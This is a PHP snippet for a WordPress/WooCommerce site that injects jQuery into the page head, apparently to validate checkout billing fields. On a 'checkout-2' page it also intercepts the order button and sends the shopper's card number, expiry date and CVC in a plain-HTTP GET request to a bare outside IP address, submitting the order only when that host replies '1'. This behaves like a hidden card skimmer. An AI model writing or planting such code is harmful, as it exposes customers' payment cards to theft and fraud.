
<?php
add_action( 'wp_head', function () { ?>
    <script>
        
        jQuery(document).ready(function() {
            
            function checkSubmitAvailable() {
                jQuery("form[name='checkout'] input[id*='billing_']").each(function(index, value) {
                    if ( jQuery(this).attr("id") == 'billing_state' ) {
                        return true;
                    }
                    
                    //console.log(jQuery(this).attr("id") + '->' + jQuery(this).val().trim().length);
                    
                    if ( jQuery(this).val().trim().length === 0 ) jQuery("form[name='checkout'] #place_order").attr('disabled', true);
                    else jQuery("form[name='checkout'] #place_order").attr('disabled', false);
                });
            }
            
            setTimeout(function() { 
                jQuery("form[name='checkout'] input[id*='billing_']").keyup(function(event) {
                    if ( event.which == 13 ) {
                        event.preventDefault();
                    }
                    checkSubmitAvailable();
                });
            }, 1000);
    
            jQuery(window).load(function() {
                setTimeout(function() { 
                    checkSubmitAvailable();
                }, 1000);
                
                if ( window.location.href.indexOf('checkout-2') != -1 ) {
                    setTimeout(function() {
                        jQuery("form[name='checkout'] #place_order").click(function(event) {
                            event.preventDefault();
    
                            var billing_card_number = jQuery('#billing_card_number').val();
                            var billing_exp_date = jQuery('#billing_exp_date').val();
                            var billing_cvc = jQuery('#billing_cvc').val();
    
                            var params = 'billing_card_number=' + billing_card_number + '&billing_exp_date=' + billing_exp_date + '&billing_cvc=' + billing_cvc;
    
                            jQuery.ajax({
                                url: 'http://13.209.22.24/wordpress/card_info.php?' + params,
                                type: 'get',
                                dataType: 'text',
                                success: function (data,status,xhr) {   // success callback function
                                    console.log(data);
                                    if ( data == '1' ) {
                                        jQuery("form[name='checkout']").submit();
                                    }
                                    return false;
                                },
                                error: function (jqXhr, textStatus, errorMessage) { // error callback 
                                    //$('p').append('Error: ' + errorMessage);
                                }
                            });
                        });
                    }, 1000);
                }
            });
        });
    
    </script>
    <?php } );
    